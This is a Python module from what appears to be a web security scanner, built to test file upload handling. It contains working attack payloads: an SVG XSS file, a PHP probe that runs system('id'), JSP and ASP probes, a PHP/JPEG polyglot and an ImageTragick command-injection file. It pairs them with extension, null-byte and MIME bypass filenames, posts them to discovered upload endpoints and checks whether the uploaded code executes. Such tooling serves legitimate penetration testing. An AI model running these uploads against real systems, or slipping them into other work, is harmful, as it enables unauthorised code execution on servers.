"""
Vexor File Upload Scanner v3.0 - Elite Level
Extension bypass, MIME bypass, double extension, null byte,
polyglot files, path traversal in filename, zip slip,
SVG XSS, PHP/JSP/ASP upload, ImageMagick exploit,
content-type bypass, magic bytes bypass
"""
import asyncio
import re
import os
from urllib.parse import urlparse, urljoin
from vexor.modules.base import BaseScanner, Finding


# ─── Malicious File Payloads ──────────────────────────────────────────────────
SVG_XSS = b"""<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('VEXOR_XSS')">
<script>alert('VEXOR_XSS')</script>
</svg>"""

PHP_WEBSHELL = b"<?php echo 'VEXOR_RCE_' . phpversion() . '_' . system('id'); ?>"
PHP_SIMPLE = b"<?php echo 'VEXOR_PHP_TEST'; ?>"
JSP_WEBSHELL = b'<%@ page import="java.io.*" %><% out.println("VEXOR_JSP_" + System.getProperty("os.name")); %>'
ASP_WEBSHELL = b'<% Response.Write("VEXOR_ASP_" & Request.ServerVariables("SERVER_SOFTWARE")) %>'

# Polyglot: valid JPEG header + PHP code
POLYGLOT_PHP_JPEG = (
    b"\xff\xd8\xff\xe0" +  # JPEG magic bytes
    b"<?php echo 'VEXOR_POLYGLOT_' . phpversion(); ?>"
)

# ImageMagick exploit (CVE-2016-3714 / ImageTragick)
IMAGETRAGICK = b"""push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|echo VEXOR_IMAGETRAGICK > /tmp/vexor_test)'
pop graphic-context"""

# ZIP slip payload (filename with path traversal)
ZIP_SLIP_FILENAME = "../../etc/vexor_test.txt"

# ─── Upload Bypass Techniques ─────────────────────────────────────────────────
BYPASS_TECHNIQUES = [
    # Double extension
    ("test.php.jpg", PHP_SIMPLE, "image/jpeg"),
    ("test.php.png", PHP_SIMPLE, "image/png"),
    ("test.php.gif", PHP_SIMPLE, "image/gif"),
    # Null byte (PHP < 5.3.4)
    ("test.php\x00.jpg", PHP_SIMPLE, "image/jpeg"),
    ("test.php%00.jpg", PHP_SIMPLE, "image/jpeg"),
    # Case variation
    ("test.PHP", PHP_SIMPLE, "image/jpeg"),
    ("test.PhP", PHP_SIMPLE, "image/jpeg"),
    ("test.pHp", PHP_SIMPLE, "image/jpeg"),
    # Alternative extensions
    ("test.php5", PHP_SIMPLE, "image/jpeg"),
    ("test.php7", PHP_SIMPLE, "image/jpeg"),
    ("test.phtml", PHP_SIMPLE, "image/jpeg"),
    ("test.pht", PHP_SIMPLE, "image/jpeg"),
    ("test.shtml", PHP_SIMPLE, "image/jpeg"),
    # MIME type bypass
    ("test.php", PHP_SIMPLE, "image/jpeg"),
    ("test.php", PHP_SIMPLE, "image/png"),
    ("test.php", PHP_SIMPLE, "image/gif"),
    ("test.php", PHP_SIMPLE, "application/octet-stream"),
    # JSP/ASP
    ("test.jsp", JSP_WEBSHELL, "image/jpeg"),
    ("test.asp", ASP_WEBSHELL, "image/jpeg"),
    ("test.aspx", ASP_WEBSHELL, "image/jpeg"),
    # SVG XSS
    ("test.svg", SVG_XSS, "image/svg+xml"),
    ("test.svg", SVG_XSS, "image/jpeg"),
    # Polyglot
    ("test.jpg", POLYGLOT_PHP_JPEG, "image/jpeg"),
    # ImageTragick
    ("test.mvg", IMAGETRAGICK, "image/jpeg"),
    ("test.svg", IMAGETRAGICK, "image/svg+xml"),
]

# ─── Upload Endpoints ─────────────────────────────────────────────────────────
UPLOAD_PATHS = [
    "/upload", "/api/upload", "/file/upload", "/media/upload",
    "/files/upload", "/image/upload", "/avatar/upload",
    "/api/files", "/api/media", "/api/images",
    "/upload/file", "/upload/image", "/upload/avatar",
]


class Scanner(BaseScanner):
    """File Upload Scanner v3.0 - Elite Level"""

    MODULE_NAME = "file_upload"
    MODULE_DESC = "File Upload: Extension/MIME/Polyglot/NullByte/PathTraversal/SVG/ImageTragick"

    async def scan(self) -> list[Finding]:
        async with self:
            await asyncio.gather(
                self._find_upload_forms(),
                self._check_upload_endpoints(),
                return_exceptions=True,
            )
        return self.findings

    async def _find_upload_forms(self) -> None:
        """Find file upload forms and test them"""
        response = await self.get(self.target)
        if not response:
            return

        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, "lxml")

            for form in soup.find_all("form"):
                file_inputs = [
                    inp for inp in form.find_all("input")
                    if inp.get("type", "").lower() == "file"
                ]
                if not file_inputs:
                    continue

                action = form.get("action", self.target)
                form_url = urljoin(self.target, action)
                method = form.get("method", "post").upper()

                for file_input in file_inputs:
                    field_name = file_input.get("name", "file")
                    accept = file_input.get("accept", "*")

                    self.add_finding(Finding(
                        severity="INFO",
                        module=self.MODULE_NAME,
                        vuln="File Upload Form Found",
                        endpoint=form_url,
                        param=field_name,
                        evidence=f"Field: {field_name}, accept={accept}",
                        description="File upload form found — testing for bypass.",
                        remediation="Validate file type, content, and size server-side.",
                    ))

                    # Get other form fields
                    other_fields = {}
                    for inp in form.find_all("input"):
                        if inp.get("type", "").lower() not in ["file", "submit", "button"]:
                            name = inp.get("name", "")
                            if name:
                                other_fields[name] = inp.get("value", "")

                    await self._test_upload_bypasses(form_url, field_name, other_fields)

        except Exception:
            pass

    async def _test_upload_bypasses(self, url: str, field_name: str, extra_fields: dict) -> None:
        """Test all upload bypass techniques"""
        import httpx

        for filename, content, mime_type in BYPASS_TECHNIQUES:
            try:
                async with httpx.AsyncClient(verify=False, timeout=20) as client:
                    files = {field_name: (filename, content, mime_type)}
                    data = dict(extra_fields)
                    resp = await client.post(url, files=files, data=data)

                    if resp.status_code not in [200, 201, 302]:
                        continue

                    # Check if upload succeeded
                    resp_text = resp.text

                    # Look for uploaded file path in response
                    path_patterns = [
                        r"(/[^\s\"'<>]+\.(php|jsp|asp|aspx|svg|mvg))",
                        r"(https?://[^\s\"'<>]+\.(php|jsp|asp|aspx|svg|mvg))",
                        r'"(url|path|file|location)"\s*:\s*"([^"]+)"',
                    ]

                    uploaded_path = None
                    for pattern in path_patterns:
                        match = re.search(pattern, resp_text, re.IGNORECASE)
                        if match:
                            uploaded_path = match.group(1)
                            break

                    # Determine what was uploaded
                    if b"VEXOR_XSS" in content:
                        vuln_type = "SVG XSS Upload"
                        severity = "HIGH"
                    elif b"VEXOR_RCE" in content or b"VEXOR_PHP" in content:
                        vuln_type = "PHP Webshell Upload"
                        severity = "CRITICAL"
                    elif b"VEXOR_JSP" in content:
                        vuln_type = "JSP Webshell Upload"
                        severity = "CRITICAL"
                    elif b"VEXOR_ASP" in content:
                        vuln_type = "ASP Webshell Upload"
                        severity = "CRITICAL"
                    elif b"VEXOR_POLYGLOT" in content:
                        vuln_type = "Polyglot PHP/JPEG Upload"
                        severity = "CRITICAL"
                    elif b"VEXOR_IMAGETRAGICK" in content:
                        vuln_type = "ImageTragick Upload"
                        severity = "CRITICAL"
                    else:
                        continue

                    evidence = (
                        f"Filename: {filename}\n"
                        f"MIME: {mime_type}\n"
                        f"HTTP {resp.status_code}"
                    )
                    if uploaded_path:
                        evidence += f"\nUploaded to: {uploaded_path}"

                        # Try to access the uploaded file
                        if uploaded_path.startswith("/"):
                            parsed = urlparse(url)
                            access_url = f"{parsed.scheme}://{parsed.netloc}{uploaded_path}"
                        else:
                            access_url = uploaded_path

                        try:
                            exec_resp = await self.get(access_url)
                            if exec_resp and any(
                                s in exec_resp.text for s in ["VEXOR_", "phpversion", "uid="]
                            ):
                                severity = "CRITICAL"
                                evidence += f"\nRCE CONFIRMED: {exec_resp.text[:100]}"
                        except Exception:
                            pass

                    self.add_finding(Finding(
                        severity=severity,
                        module=self.MODULE_NAME,
                        vuln=f"File Upload Bypass — {vuln_type}",
                        endpoint=url,
                        param=field_name,
                        payload=f"{filename} ({mime_type})",
                        evidence=evidence,
                        description=(
                            f"File upload bypass: {filename} with MIME {mime_type} accepted. "
                            f"Type: {vuln_type}."
                        ),
                        remediation=(
                            "Validate file extension AND magic bytes (not just MIME). "
                            "Store uploads outside web root. "
                            "Rename uploaded files. "
                            "Use a CDN for serving user uploads."
                        ),
                    ))
                    return  # One finding per form is enough

            except Exception:
                continue

    async def _check_upload_endpoints(self) -> None:
        """Check common upload endpoints"""
        parsed = urlparse(self.target)
        base = f"{parsed.scheme}://{parsed.netloc}"

        for path in UPLOAD_PATHS:
            url = base + path
            try:
                resp = await self.get(url)
                if resp and resp.status_code in [200, 405]:
                    self.add_finding(Finding(
                        severity="INFO",
                        module=self.MODULE_NAME,
                        vuln=f"Upload Endpoint Found: {path}",
                        endpoint=url,
                        evidence=f"HTTP {resp.status_code}",
                        description=f"Upload endpoint at {path}.",
                        remediation="Test for file type bypass and path traversal.",
                    ))

                    # Test upload endpoint directly
                    if resp.status_code == 200:
                        await self._test_upload_bypasses(url, "file", {})

            except Exception:
                continue
